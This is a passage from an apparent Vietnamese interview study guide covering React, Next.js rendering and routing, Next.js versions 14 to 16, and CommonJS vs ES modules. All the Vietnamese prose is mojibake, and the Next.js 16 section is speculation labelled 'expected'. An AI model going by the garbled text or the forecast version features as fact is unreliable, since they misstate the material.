3. **Virtual DOM**: Reconciliation, key trong lists, táº¡i sao khÃ´ng dÃ¹ng index
4. **Performance**: PureComponent, React.memo, state vs props, parent/child re-render optimization
5. **Advanced Patterns**: HOC, Render Props, Compound Components
6. **React Features**: Batching, Code Splitting, Portal, Error Boundaries, Fragments
7. **React 18+**: Suspense, Server Components, Concurrent Rendering, useTransition, useDeferredValue, Hydration
8. **Routing**: React Router basics

**ğŸ’¡ Key Takeaways cho Interview:**
- Hiá»ƒu sÃ¢u useEffect cleanup function vÃ  dependency array
- Biáº¿t khi nÃ o dÃ¹ng useMemo/useCallback (khÃ´ng over-optimize)
- Virtual DOM diffing algorithm vÃ  táº§m quan trá»ng cá»§a key
- React.memo + stable references (useMemo/useCallback) Ä‘á»ƒ tá»‘i Æ°u re-renders
- React 18 concurrent features (useTransition, useDeferredValue)
- Error Boundaries chá»‰ catch rendering errors, khÃ´ng catch event handlers/async

---
</details>


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">â–² Q36: Next.js - React Framework for Production</span></summary>


**ğŸ¯ Next.js lÃ  gÃ¬:**
- React framework for production vá»›i built-in routing, SSR, SSG, API routes
- Tá»‘i Æ°u performance, SEO, developer experience
- Zero-config, file-based routing, automatic code splitting

#### **ğŸ“š PHáº¦N 1: CORE FEATURES**

##### **1.1. Rendering Methods**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 1. SSR - Server-Side Rendering (má»—i request)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Cháº¡y trÃªn server Má»–I request â†’ Fresh data, tá»‘t cho SEO
export async function getServerSideProps(context) {
  const res = await fetch('https://api.example.com/data');
  const data = await res.json();
  
  return {
    props: { data }, // Passed to page component
  };
}

function Page({ data }) {
  return <div>{data.title}</div>;
}

// âœ… Khi nÃ o dÃ¹ng: Data thay Ä‘á»•i thÆ°á»ng xuyÃªn, cáº§n real-time
// âš ï¸ NhÆ°á»£c Ä‘iá»ƒm: Slower TTFB (Time To First Byte), server load cao

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 2. SSG - Static Site Generation (build time)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Generate HTML táº¡i BUILD TIME â†’ Serve static files (cá»±c nhanh)
export async function getStaticProps() {
  const res = await fetch('https://api.example.com/posts');
  const posts = await res.json();
  
  return {
    props: { posts },
    revalidate: 60, // ISR: Re-generate má»—i 60s náº¿u cÃ³ request
  };
}

// Dynamic routes vá»›i SSG
export async function getStaticPaths() {
  const res = await fetch('https://api.example.com/posts');
  const posts = await res.json();
  
  const paths = posts.map(post => ({
    params: { id: post.id.toString() },
  }));
  
  return {
    paths, // Pre-render nhá»¯ng paths nÃ y
    fallback: 'blocking', // 'blocking' | true | false
  };
}

// âœ… Khi nÃ o dÃ¹ng: Blog, docs, marketing pages (static content)
// âœ… Æ¯u Ä‘iá»ƒm: Cá»±c nhanh, CDN-friendly, tá»‘t cho SEO

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 3. ISR - Incremental Static Regeneration
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
export async function getStaticProps() {
  const data = await fetchData();
  
  return {
    props: { data },
    revalidate: 10, // Re-generate page má»—i 10s (stale-while-revalidate)
  };
}

// Flow:
// 1. Request â†’ Serve stale page (instant)
// 2. Background: Re-generate new page
// 3. Next request â†’ Serve fresh page
// âœ… Best of both worlds: Static speed + Fresh data

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 4. CSR - Client-Side Rendering
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
import useSWR from 'swr';

function Profile() {
  const { data, error } = useSWR('/api/user', fetcher);
  
  if (error) return <div>Failed to load</div>;
  if (!data) return <div>Loading...</div>;
  
  return <div>Hello {data.name}</div>;
}

// âœ… Khi nÃ o dÃ¹ng: Private pages, dashboards, user-specific data
// âš ï¸ NhÆ°á»£c Ä‘iá»ƒm: KhÃ´ng tá»‘t cho SEO, slower initial load
```

**ğŸ“Š So sÃ¡nh Rendering Methods:**

| Method | Build Time | Request Time | SEO | Speed | Use Case |
|--------|-----------|--------------|-----|-------|----------|
| **SSG** | Generate HTML | Serve static | â­â­â­ | â­â­â­ | Blog, docs |
| **ISR** | Generate HTML | Serve static + revalidate | â­â­â­ | â­â­â­ | E-commerce |
| **SSR** | - | Generate HTML | â­â­â­ | â­â­ | Real-time data |
| **CSR** | - | Fetch on client | â­ | â­ | Dashboards |

---

##### **1.2. File-Based Routing**

```typescript
// pages/index.tsx â†’ /
// pages/about.tsx â†’ /about
// pages/blog/[slug].tsx â†’ /blog/:slug (dynamic)
// pages/blog/[...slug].tsx â†’ /blog/* (catch-all)
// pages/api/hello.ts â†’ /api/hello (API route)

// Dynamic route example
// pages/posts/[id].tsx
import { useRouter } from 'next/router';

function Post() {
  const router = useRouter();
  const { id } = router.query; // Get dynamic param
  
  return <div>Post: {id}</div>;
}

// Catch-all route: pages/docs/[...slug].tsx
// Matches: /docs/a, /docs/a/b, /docs/a/b/c
function Docs() {
  const router = useRouter();
  const { slug } = router.query; // slug = ['a', 'b', 'c']
  
  return <div>Path: {slug?.join('/')}</div>;
}

// Programmatic navigation
const router = useRouter();
router.push('/about'); // Client-side navigation
router.push({ pathname: '/post/[id]', query: { id: '1' } });
router.replace('/login'); // Replace history
router.back(); // Go back
```

---

##### **1.3. API Routes**

```typescript
// pages/api/user.ts
import type { NextApiRequest, NextApiResponse } from 'next';

type Data = {
  name: string;
};

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  // Method-based routing
  if (req.method === 'POST') {
    // Handle POST
    const { name } = req.body;
    res.status(200).json({ name });
  } else {
    // Handle GET
    res.status(200).json({ name: 'John Doe' });
  }
}

// Dynamic API route: pages/api/posts/[id].ts
export default function handler(req, res) {
  const { id } = req.query;
  res.status(200).json({ post: id });
}

// âœ… Use cases: Backend logic, database queries, authentication
```

---

##### **1.4. Image Optimization**

```typescript
import Image from 'next/image';

// Automatic optimization, lazy loading, responsive
function Avatar() {
  return (
    <Image
      src="/me.png"
      alt="Picture"
      width={500}
      height={500}
      priority // Load eagerly (above fold)
      placeholder="blur" // Blur placeholder while loading
      blurDataURL="data:image/..." // Custom blur
    />
  );
}

// External images
<Image
  src="https://example.com/photo.jpg"
  alt="Photo"
  width={800}
  height={600}
  loader={({ src, width, quality }) => {
    return `${src}?w=${width}&q=${quality || 75}`;
  }}
/>

// âœ… Benefits:
// - Auto WebP/AVIF conversion
// - Lazy loading (viewport intersection)
// - Responsive images (srcset)
// - Prevent layout shift (width/height required)
```

---

#### **ğŸ“š PHáº¦N 2: ADVANCED FEATURES**

##### **2.1. Middleware (Next.js 12+)**

```typescript
// middleware.ts (root level)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

// Cháº¡y TRÆ¯á»šC request Ä‘áº¿n page/API
export function middleware(request: NextRequest) {
  // Authentication
  const token = request.cookies.get('token');
  
  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  // A/B Testing
  const bucket = request.cookies.get('bucket') || Math.random() > 0.5 ? 'a' : 'b';
  const response = NextResponse.next();
  response.cookies.set('bucket', bucket);
  
  // Rewrite (thay Ä‘á»•i URL ná»™i bá»™)
  if (request.nextUrl.pathname === '/old-blog') {
    return NextResponse.rewrite(new URL('/blog', request.url));
  }
  
  return response;
}

// Chá»‰ cháº¡y cho specific paths
export const config = {
  matcher: ['/dashboard/:path*', '/api/:path*'],
};
```

---

##### **2.2. App Router (Next.js 13+ - New)**

```typescript
// app/layout.tsx - Root layout
export default function RootLayout({ children }) {
  return (
    <html>
      <body>{children}</body>
    </html>
  );
}

// app/page.tsx - Home page (Server Component máº·c Ä‘á»‹nh)
async function getData() {
  const res = await fetch('https://api.example.com/data');
  return res.json();
}

export default async function Page() {
  const data = await getData(); // Async component!
  return <div>{data.title}</div>;
}

// app/dashboard/layout.tsx - Nested layout
export default function DashboardLayout({ children }) {
  return (
    <div>
      <Sidebar />
      {children}
    </div>
  );
}

// Client component (when needed)
'use client'; // Directive

import { useState } from 'react';

export default function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}
```

---

##### **2.3. Data Fetching (App Router)**

```typescript
// Fetch with caching
async function getData() {
  const res = await fetch('https://api.example.com/data', {
    cache: 'force-cache', // SSG-like (default)
  });
  return res.json();
}

// Revalidate every 10s (ISR)
async function getData() {
  const res = await fetch('https://api.example.com/data', {
    next: { revalidate: 10 },
  });
  return res.json();
}

// No caching (SSR-like)
async function getData() {
  const res = await fetch('https://api.example.com/data', {
    cache: 'no-store',
  });
  return res.json();
}

// Parallel data fetching
export default async function Page() {
  const [user, posts] = await Promise.all([
    fetch('/api/user').then(r => r.json()),
    fetch('/api/posts').then(r => r.json()),
  ]);
  
  return <div>{user.name} - {posts.length} posts</div>;
}
```

---

#### **ğŸ“š PHáº¦N 3: SEO OPTIMIZATION**

##### **3.1. Metadata & SEO**

```typescript
// pages/index.tsx (Pages Router)
import Head from 'next/head';

export default function Home() {
  return (
    <>
      <Head>
        <title>My Page Title</title>
        <meta name="description" content="Page description" />
        <meta property="og:title" content="OG Title" />
        <meta property="og:description" content="OG Description" />
        <meta property="og:image" content="https://example.com/og.jpg" />
        <meta name="twitter:card" content="summary_large_image" />
        <link rel="canonical" href="https://example.com" />
      </Head>
      <h1>Home</h1>
    </>
  );
}

// app/page.tsx (App Router) - Metadata API
import type { Metadata } from 'next';

export const metadata: Metadata = {
  title: 'My Page Title',
  description: 'Page description',
  openGraph: {
    title: 'OG Title',
    description: 'OG Description',
    images: [{ url: 'https://example.com/og.jpg' }],
  },
  twitter: {
    card: 'summary_large_image',
  },
};

// Dynamic metadata
export async function generateMetadata({ params }): Promise<Metadata> {
  const product = await fetch(`/api/products/${params.id}`).then(r => r.json());
  
  return {
    title: product.name,
    description: product.description,
    openGraph: {
      images: [product.image],
    },
  };
}
```

---

##### **3.2. SEO Best Practices**

```typescript
// 1. Sitemap Generation (pages/api/sitemap.xml.ts)
export default function Sitemap() {
  // Generate sitemap XML
}

// 2. robots.txt (public/robots.txt)
// User-agent: *
// Allow: /
// Sitemap: https://example.com/sitemap.xml

// 3. Structured Data (JSON-LD)
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify({
      '@context': 'https://schema.org',
      '@type': 'Article',
      headline: 'Article Title',
      author: { '@type': 'Person', name: 'Author' },
    }),
  }}
/>

// 4. Image Alt Text
<Image src="/photo.jpg" alt="Descriptive alt text" width={500} height={500} />

// 5. Semantic HTML
<article>
  <h1>Title</h1>
  <p>Content</p>
</article>

// 6. Internal Linking
import Link from 'next/link';
<Link href="/about">About</Link> // Prefetch on hover
```

---

#### **ğŸ“š PHáº¦N 4: Æ¯U & NHÆ¯á»¢C ÄIá»‚M**

**âœ… Æ¯u Ä‘iá»ƒm:**

1. **SEO Excellent**: SSR/SSG â†’ Search engines index easily
2. **Performance**: Automatic code splitting, image optimization, font optimization
3. **Developer Experience**: Hot reload, TypeScript support, zero config
4. **Flexibility**: SSG, SSR, ISR, CSR - chá»n per page
5. **Built-in Features**: Routing, API routes, image optimization, i18n
6. **Production Ready**: Vercel deployment, edge functions, analytics

**âš ï¸ NhÆ°á»£c Ä‘iá»ƒm:**

1. **Learning Curve**: Nhiá»u concepts (SSR, SSG, ISR, hydration)
2. **Opinionated**: File-based routing, specific structure
3. **Build Time**: SSG vá»›i nhiá»u pages â†’ long build time
4. **Server Costs**: SSR requires server (khÃ´ng thá»ƒ pure static hosting)
5. **Vendor Lock-in**: Best vá»›i Vercel, other platforms cáº§n config thÃªm
6. **Bundle Size**: Framework overhead (though optimized)

---

#### **ğŸ“š PHáº¦N 5: PERFORMANCE OPTIMIZATION**

```typescript
// 1. Dynamic Imports (Code Splitting)
import dynamic from 'next/dynamic';

const DynamicComponent = dynamic(() => import('../components/Heavy'), {
  loading: () => <p>Loading...</p>,
  ssr: false, // Disable SSR for this component
});

// 2. Font Optimization
import { Inter } from 'next/font/google';

const inter = Inter({ subsets: ['latin'] });

export default function App({ Component, pageProps }) {
  return (
    <main className={inter.className}>
      <Component {...pageProps} />
    </main>
  );
}

// 3. Script Optimization
import Script from 'next/script';

<Script
  src="https://analytics.com/script.js"
  strategy="lazyOnload" // afterInteractive | beforeInteractive | lazyOnload
/>

// 4. Streaming (App Router)
import { Suspense } from 'react';

export default function Page() {
  return (
    <Suspense fallback={<Loading />}>
      <SlowComponent />
    </Suspense>
  );
}
```

---

#### **ğŸ“š PHáº¦N 6: NEXT.JS 14 vs 15 vs 16 - Sá»° KHÃC BIá»†T**

##### **6.1. Next.js 14 (October 2023)**

**ğŸ¯ Key Features:**

```typescript
// 1. Turbopack (Beta) - Faster dev server
// next.config.js
module.exports = {
  experimental: {
    turbo: {}, // Opt-in Turbopack (5000+ tests passing)
  },
};

// 2. Server Actions (Stable)
// app/actions.ts
'use server';

export async function createPost(formData: FormData) {
  const title = formData.get('title');
  await db.posts.create({ title });
  revalidatePath('/posts');
}

// app/page.tsx
export default function Page() {
  return (
    <form action={createPost}>
      <input name="title" />
      <button type="submit">Create</button>
    </form>
  );
}

// 3. Partial Prerendering (Preview) - Hybrid SSR + Static
// Combines static shell + dynamic content
export const experimental_ppr = true; // Per-route

// 4. Metadata Improvements
export const metadata = {
  metadataBase: new URL('https://example.com'),
  alternates: {
    canonical: '/',
    languages: { 'en-US': '/en-US', 'vi-VN': '/vi-VN' },
  },
};
```

**ğŸ“Š Next.js 14 Highlights:**
- âœ… Turbopack dev mode (53% faster)
- âœ… Server Actions stable
- âœ… Partial Prerendering preview
- âœ… Improved `next/image`

---

##### **6.2. Next.js 15 (October 2024)**

**ğŸ¯ Key Features:**

```typescript
// 1. React 19 Support
// - React Compiler (automatic memoization)
// - New hooks: useFormStatus, useOptimistic
// - Server Components improvements

// 2. Async Request APIs (Breaking Change)
// Before (Next 14): Synchronous
import { cookies, headers } from 'next/headers';
const cookieStore = cookies();

// After (Next 15): Async
const cookieStore = await cookies();
const headersList = await headers();

// 3. Caching Behavior Changes
// Next 14: fetch() cached by default
// Next 15: fetch() NOT cached by default (opt-in caching)

// Opt-in caching
fetch('https://api.example.com', { cache: 'force-cache' });

// 4. Turbopack Dev (Stable)
// No longer experimental, default in development
// next.config.js - Auto-enabled

// 5. Hydration Error Improvements
// Better error messages with source code context
// Automatic suggestions for common issues

// 6. Static Route Indicator
// Dev overlay shows which routes are static/dynamic
// <NextIndicator /> shows route type

// 7. Form Submissions
import { useFormStatus } from 'react-dom';

function SubmitButton() {
  const { pending } = useFormStatus();
  return <button disabled={pending}>Submit</button>;
}
```

**ğŸ“Š Next.js 15 Highlights:**
- âœ… React 19 RC support
- âœ… Async request APIs (breaking)
- âœ… Caching opt-in (breaking)
- âœ… Turbopack stable in dev
- âœ… Better hydration errors
- âš ï¸ Breaking changes from 14

---

##### **6.3. Next.js 16 (Expected Q1 2025)**

**ğŸ¯ Expected Features (Based on Roadmap):**

```typescript
// 1. Turbopack Build (Production)
// Currently dev-only, production builds will use Turbopack
// Faster builds, less memory usage

// 2. Partial Prerendering (Stable)
// pages/product/[id].tsx
export const experimental_ppr = true;

export default async function Product({ params }) {
  // Static shell renders immediately
  return (
    <div>
      <h1>Product {params.id}</h1>
      
      {/* Dynamic content loads after */}
      <Suspense fallback={<Skeleton />}>
        <ProductDetails id={params.id} />
      </Suspense>
      
      <Suspense fallback={<Skeleton />}>
        <Reviews id={params.id} />
      </Suspense>
    </div>
  );
}

// 3. Enhanced React Compiler Integration
// Auto-optimize components without manual memo/useCallback
function Component({ items }) {
  // Automatically optimized by React Compiler
  const filtered = items.filter(item => item.active);
  return <List items={filtered} />;
}

// 4. Improved Streaming
// Better support for streaming SSR
// Selective hydration improvements

// 5. Edge Runtime Enhancements
// More Node.js APIs available in Edge Runtime
// Better compatibility with existing packages
```

**ğŸ“Š Next.js 16 Expected Features:**
- âœ… Turbopack production builds
- âœ… PPR stable (game-changer for performance)
- âœ… React Compiler default
- âœ… Better streaming & hydration
- âœ… Edge Runtime maturity

---

##### **6.4. Comparison Table: Next.js 14 vs 15 vs 16**

| Feature | Next.js 14 | Next.js 15 | Next.js 16 (Expected) |
|---------|-----------|-----------|---------------------|
| **React Version** | 18 | 19 RC | 19 Stable |
| **Turbopack Dev** | Beta | âœ… Stable | âœ… Stable |
| **Turbopack Build** | âŒ | âŒ | âœ… Stable |
| **Server Actions** | âœ… Stable | âœ… Stable | âœ… Enhanced |
| **PPR** | Preview | Experimental | âœ… Stable |
| **Request APIs** | Sync | âš ï¸ Async (breaking) | Async |
| **Caching** | Default ON | âš ï¸ Default OFF (breaking) | Opt-in |
| **React Compiler** | âŒ | Experimental | âœ… Default |
| **Hydration Errors** | Basic | âœ… Improved | Enhanced |
| **Edge Runtime** | Basic | Improved | âœ… Mature |

---

##### **6.5. Migration Guide: 14 â†’ 15 â†’ 16**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NEXT 14 â†’ 15 (Breaking Changes)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// 1. Update async request APIs
// Before (14)
import { cookies } from 'next/headers';
const cookieStore = cookies();

// After (15)
const cookieStore = await cookies();

// 2. Update caching behavior
// Before (14) - cached by default
fetch('https://api.example.com');

// After (15) - opt-in caching
fetch('https://api.example.com', { cache: 'force-cache' });

// 3. Update next.config.js
// Remove experimental turbo flag (now default)
module.exports = {
  // experimental: { turbo: {} }, // Remove this
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NEXT 15 â†’ 16 (Expected Changes)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// 1. Enable PPR for production
export const experimental_ppr = true; // Becomes stable

// 2. Remove manual optimizations (React Compiler handles)
// Before (15)
const memoized = useMemo(() => compute(data), [data]);
const callback = useCallback(() => handleClick(), []);

// After (16) - Compiler auto-optimizes
const memoized = compute(data); // Auto-memoized
const callback = () => handleClick(); // Auto-memoized

// 3. Turbopack production builds
// package.json
{
  "scripts": {
    "build": "next build" // Uses Turbopack automatically
  }
}
```

---

##### **6.6. Khi nÃ o nÃªn upgrade?**

**ğŸ“Œ Next.js 14:**
- âœ… Production-ready, stable
- âœ… Good for existing projects
- âœ… Server Actions stable
- âš ï¸ Will need migration to 15 eventually

**ğŸ“Œ Next.js 15:**
- âœ… Latest stable (as of Oct 2024)
- âœ… React 19 RC support
- âœ… Better DX (Turbopack, hydration errors)
- âš ï¸ Breaking changes from 14
- âš ï¸ Caching behavior changes need attention

**ğŸ“Œ Next.js 16:**
- ğŸ”® Not released yet (Q1 2025)
- âœ… Wait for: PPR stable, Turbopack build, React Compiler
- âš ï¸ Early adoption may have bugs

**ğŸ’¡ Recommendation:**
- **New projects**: Next.js 15 (latest stable)
- **Existing projects**: Stay on 14 until 15.1+ (bug fixes)
- **Enterprise**: Wait for 15.2+ or LTS versions

---

#### **ğŸ¯ TÃ“M Táº®T Q40 - NEXT.JS**

**âœ… Core Features:**
- **Rendering**: SSR, SSG, ISR, CSR - chá»n per page
- **Routing**: File-based, dynamic routes, API routes
- **Optimization**: Image, font, script automatic optimization
- **SEO**: Built-in metadata API, sitemap, structured data

**ğŸ’¡ SEO Techniques:**
1. SSR/SSG cho better indexing
2. Metadata API (title, description, OG tags)
3. Structured data (JSON-LD)
4. Image optimization vá»›i alt text
5. Sitemap & robots.txt
6. Internal linking vá»›i Link component

**ğŸš€ Khi nÃ o dÃ¹ng Next.js:**
- Cáº§n SEO (blog, e-commerce, marketing)
- Performance-critical apps
- Full-stack React apps (API routes)
- Static sites vá»›i dynamic features

---
</details>




## **Pháº§n 15: Bá»• Sung NÃ¢ng Cao**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“¦ Q37: CommonJS vs ES Modules (ESM) & Bundling Deep Dive</span></summary>


**Tráº£ lá»i:**

**ğŸ¯ Core Concepts:**

**1. CommonJS (CJS) - Node.js Module System:**
- **Syntax**: `require()` Ä‘á»ƒ import, `module.exports` Ä‘á»ƒ export
- **Loading**: Synchronous (Ä‘á»“ng bá»™), blocking I/O
- **Execution**: Runtime evaluation, dynamic imports
- **Scope**: File-based, isolated module scope
- **Extension**: `.js`, `.cjs`
- **Use Case**: Node.js backend, legacy packages

**2. ES Modules (ESM) - JavaScript Standard:**
- **Syntax**: `import/export` statements
- **Loading**: Asynchronous (báº¥t Ä‘á»“ng bá»™), non-blocking
- **Execution**: Static analysis, compile-time resolution
- **Scope**: Module scope vá»›i strict mode máº·c Ä‘á»‹nh
- **Extension**: `.mjs`, `.js` (vá»›i `"type": "module"` trong package.json)
- **Use Case**: Modern browsers, Node.js (v12+), frontend frameworks

**âœ… Æ¯u Ä‘iá»ƒm ESM:**
- **Static Analysis**: Bundlers cÃ³ thá»ƒ tree-shake dead code táº¡i compile time
- **Async Loading**: KhÃ´ng block main thread, tá»‘t cho performance
- **Browser Native**: Modern browsers há»— trá»£ native, khÃ´ng cáº§n bundler cho dev
- **Explicit Dependencies**: Import statements rÃµ rÃ ng, dá»… trace
- **Named Exports**: Há»— trá»£ multiple exports tá»« má»™t file

**âš ï¸ NhÆ°á»£c Ä‘iá»ƒm ESM:**
- **Backward Compatibility**: KhÃ´ng cháº¡y trÃªn legacy browsers
- **File Extensions Required**: Pháº£i specify `.js` extension trong imports (browser)
- **CORS Issues**: Cáº§n proper headers khi load tá»« CDN
- **Debugging**: Source maps cáº§n thiáº¿t cho bundled code

**Code Example - CommonJS vs ESM:**

```typescript
// ============================================
// COMMONJS (Node.js Traditional)
// ============================================

// math.js - CommonJS Export
function add(a, b) {
  return a + b;
}

function subtract(a, b) {
  return a - b;
}

// Export toÃ n bá»™ object
module.exports = {
  add,
  subtract,
};

// Hoáº·c export individual
exports.add = add;
exports.subtract = subtract;

// app.js - CommonJS Import
const math = require('./math'); // Synchronous loading
console.log(math.add(1, 2)); // 3

// Destructuring import
const { add, subtract } = require('./math');
console.log(add(1, 2)); // 3

// Dynamic import (runtime)
const moduleName = './math';
const math2 = require(moduleName); // âœ… Works - runtime evaluation

// Conditional import
if (condition) {
  const math3 = require('./math'); // âœ… Works
}

// ============================================
// ES MODULES (Modern JavaScript)
// ============================================

// math.mjs - ESM Named Exports
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

// Default export
export default function multiply(a: number, b: number): number {
  return a * b;
}

// app.mjs - ESM Import
import multiply, { add, subtract } from './math.mjs'; // Async loading
console.log(add(1, 2)); // 3
console.log(multiply(3, 4)); // 12

// Import all
import * as math from './math.mjs';
console.log(math.add(1, 2)); // 3

// Dynamic import (async)
const modulePath = './math.mjs';
// import modulePath; // âŒ Error - must be static string

// Dynamic import with await
const { add: dynamicAdd } = await import('./math.mjs'); // âœ… Works

// Conditional import
if (condition) {
  const { add } = await import('./math.mjs'); // âœ… Works with await
}

// ============================================
// BROWSER USAGE - Native ESM
// ============================================
```

```html
<!-- index.html - Browser Native ESM -->
<!DOCTYPE html>
<html>
<head>
  <title>ESM in Browser</title>
</head>
<body>
  <!-- Traditional script (no modules) -->
  <script src="./legacy.js"></script>
  
  <!-- ESM - type="module" enables import/export -->
  <script type="module">
    // Import tá»« local file
    import { add } from './utils/math.js'; // Pháº£i cÃ³ .js extension
    console.log('1 + 2 =', add(1, 2));

    // Import tá»« CDN (ESM format)
    import confetti from 'https://cdn.skypack.dev/canvas-confetti';
    confetti();

    // Dynamic import cho code splitting
    document.getElementById('btn')?.addEventListener('click', async () => {
      // Lazy load heavy module khi user click
      const { heavyFunction } = await import('./heavy-feature.js');
      heavyFunction();
    });

    // Import maps (Chrome 89+)
    // <script type="importmap">
    // {
    //   "imports": {
    //     "lodash": "https://cdn.skypack.dev/lodash",
    //     "react": "https://cdn.skypack.dev/react"
    //   }
    // }
    // </script>
    
    // Then import nhÆ° package name
    // import _ from 'lodash';
  </script>

  <!-- Preload modules cho better performance -->
  <link rel="modulepreload" href="./utils/math.js">
  <link rel="modulepreload" href="./heavy-feature.js">
</body>
</html>
```

**Vietnamese Explanation - CÃ¡ch Hoáº¡t Äá»™ng:**

```typescript
// ============================================
// COMMONJS LOADING MECHANISM
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * 1. SYNCHRONOUS LOADING (Äá»“ng Bá»™):
 *    - require() Ä‘á»c file NGAY Láº¬P Tá»¨C
 *    - Block execution cho Ä‘áº¿n khi file loaded
 *    - Cached sau láº§n Ä‘áº§u (module.exports object Ä‘Æ°á»£c cache)
 * 
 * 2. RUNTIME EVALUATION:
 *    - Code trong module Ä‘Æ°á»£c execute ngay khi require()
 *    - Dynamic imports allowed (require vá»›i string variable)
 *    - Conditional requires allowed
 * 
 * 3. CACHING:
 *    - Module chá»‰ execute Má»˜T Láº¦N
 *    - CÃ¡c láº§n require() sau return cached exports
 *    - require.cache chá»©a táº¥t cáº£ loaded modules
 */

// Example: CommonJS caching
// a.js
console.log('Module A loaded'); // Chá»‰ log 1 láº§n
module.exports = { name: 'A' };

// main.js
const a1 = require('./a'); // Log: "Module A loaded"
const a2 = require('./a'); // KhÃ´ng log gÃ¬ (cached)
console.log(a1 === a2); // true - same object reference

// ============================================
// ESM LOADING MECHANISM
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * 1. ASYNCHRONOUS LOADING (Báº¥t Äá»“ng Bá»™):
 *    - import statements parsed trÆ°á»›c khi execution
 *    - Browser fetch modules parallel, khÃ´ng block
 *    - Modules execute theo dependency order
 * 
 * 2. STATIC ANALYSIS:
 *    - Import/export pháº£i lÃ  static strings (khÃ´ng thá»ƒ dÃ¹ng variables)
 *    - Bundlers cÃ³ thá»ƒ analyze dependencies táº¡i build time
 *    - Tree-shaking possible (remove unused exports)
 * 
 * 3. MODULE GRAPH:
 *    - Browser xÃ¢y dá»±ng dependency graph
 *    - Fetch â†’ Parse â†’ Instantiate â†’ Evaluate
 *    - Má»—i module chá»‰ evaluate Má»˜T Láº¦N
 * 
 * 4. LIVE BINDINGS:
 *    - Imported values lÃ  REFERENCES, khÃ´ng pháº£i copies
 *    - Changes trong export module reflect trong import
 */

// Example: ESM live bindings
// counter.mjs
export let count = 0;
export function increment() {
  count++;
}

// main.mjs
import { count, increment } from './counter.mjs';
console.log(count); // 0
increment();
console.log(count); // 1 - live binding updated!

// CommonJS would copy value:
// const { count } = require('./counter.js');
// increment();
// console.log(count); // Still 0 - copied value

// ============================================
// BUNDLING vá»›i ESBuild (Ultra-Fast Bundler)
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * ESBuild lÃ  extremely fast bundler viáº¿t báº±ng Go
 * - 10-100x nhanh hÆ¡n Webpack/Rollup
 * - Built-in TypeScript support
 * - Tree-shaking tá»± Ä‘á»™ng
 * - Code splitting
 * - Minification
 */

// esbuild.config.js
import * as esbuild from 'esbuild';

// Basic build
await esbuild.build({
  entryPoints: ['src/index.ts'],
  bundle: true, // Bundle táº¥t cáº£ dependencies
  outfile: 'dist/bundle.js',
  minify: true, // Minify code
  sourcemap: true, // Generate source maps
  target: 'es2020', // Target environment
  format: 'esm', // Output format: 'esm' | 'cjs' | 'iife'
  platform: 'browser', // 'browser' | 'node' | 'neutral'
  
  // Tree-shaking configuration
  treeShaking: true,
  
  // External dependencies (khÃ´ng bundle)
  external: ['react', 'react-dom'],
  
  // Define global constants
  define: {
    'process.env.NODE_ENV': '"production"',
  },
  
  // Plugin system
  plugins: [],
});

// Advanced: Code Splitting vá»›i multiple entry points
await esbuild.build({
  entryPoints: {
    home: 'src/pages/home.ts',
